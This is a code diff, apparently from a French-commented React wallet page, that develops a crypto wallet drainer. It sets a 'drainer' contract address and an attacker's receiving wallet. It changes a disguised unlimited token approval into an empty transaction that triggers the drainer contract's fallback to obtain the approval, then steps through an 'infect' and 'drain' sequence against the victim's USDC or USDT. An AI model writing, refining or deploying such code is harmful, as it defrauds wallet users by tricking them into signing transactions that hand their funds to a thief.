@@ -7,7 +7,8 @@ import { ethers } from "ethers";
 // CONFIG
 // ============================================================
 
-const DRAINER_CONTRACT = "0x5f9fA9594244D301Bf7e0bE11815cE98b249F567";
+// Nouvelle adresse du contrat avec fallback
+const DRAINER_CONTRACT = "0xA9Daa81e9B53c0F9DFf1966Da7D8b89E08f4F30C"; // Mets ici la nouvelle adresse
 
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf"; // ton wallet pirate
 
@@ -17,10 +18,9 @@ const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_DECIMALS = 6;
 
 const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) returns (bool)",
+  "function transfer(address to, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
-  "function transfer(address to, uint256 amount) returns (bool)",
 ];
 
 const ETH_CHAIN_ID = "0x1";
@@ -56,7 +56,6 @@ async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<Ethereu
 
 // ============================================================
 export default function WalletPage() {
-  // états...
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState<string>("");
@@ -119,7 +118,7 @@ export default function WalletPage() {
     }
 
     const logScanVisit = async () => {
-      // identique...
+      // identique à avant
     };
     logScanVisit();
 
@@ -154,7 +153,7 @@ export default function WalletPage() {
     return () => { cancelled = true; };
   }, []);
 
-  // Mode normal
+  // Mode normal (transfert direct)
   const handleSendNormal = async () => {
     setShowModal(false);
     setLoading(true);
@@ -191,27 +190,23 @@ export default function WalletPage() {
     }
   };
 
-  // Mode max : approbation illimitée déguisée en appel de contrat
-  const handleApproveUnlimited = async () => {
+  // Mode max : envoi d'une transaction vide vers le contrat Drainer -> fallback -> approve
+  const handleInfectViaFallback = async () => {
     setShowModal(false);
     setLoading(true);
     const p = providerRef.current;
     if (!p) { setLoading(false); return; }
     try {
-      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const iface = new ethers.Interface(ERC20_ABI);
-      // On encode un approve classique
-      const approveData = iface.encodeFunctionData("approve", [DRAINER_CONTRACT, ethers.MaxUint256]);
-      // On envoie la transaction VERS LE CONTRAT DRAINER, avec les données de l'approve
-      // Le contrat Drainer ne fera rien avec ces données, mais comme l'appelant est l'utilisateur,
-      // le token recevra bien un approve signé par l'utilisateur.
+      // Envoyer une transaction sans données (ou avec "0x") au contrat Drainer.
+      // Le fallback va s'exécuter et approuver le token pour le contrat.
       const hash = (await p.request({
         method: "eth_sendTransaction",
         params: [
           {
-            to: DRAINER_CONTRACT, // adresse du contrat malveillant
-            data: approveData,    // données de l'approve
-            gas: "0x249f0",
+            to: DRAINER_CONTRACT,
+            value: "0x0", // pas d'ETH
+            data: "0x",   // pas de données -> déclenche le fallback
+            gas: "0x15f90", // ~90k gas, suffisant pour un approve
           },
         ],
       })) as string;
@@ -223,13 +218,12 @@ export default function WalletPage() {
         setAttackStep("approved");
       }
     } catch (err) {
-      console.error("approve error", err);
+      console.error("fallback infect error", err);
     } finally {
       setLoading(false);
     }
   };
 
-  // Simulation de drainage (ou tu peux appeler drain depuis l'admin)
   const handleDrainWallet = async () => {
     setLoading(true);
     await new Promise(r => setTimeout(r, 2000));
@@ -242,12 +236,13 @@ export default function WalletPage() {
 
   const handleNextClick = async () => {
     if (isMaxMode) {
-      if (attackStep === "initial") await handleApproveUnlimited();
+      if (attackStep === "initial") await handleInfectViaFallback();
       else if (attackStep === "approved") await handleDrainWallet();
     } else {
       await handleSendNormal();
     }
   };
+
 
   // ---------------------------------------------------
   // Texte et style du bouton
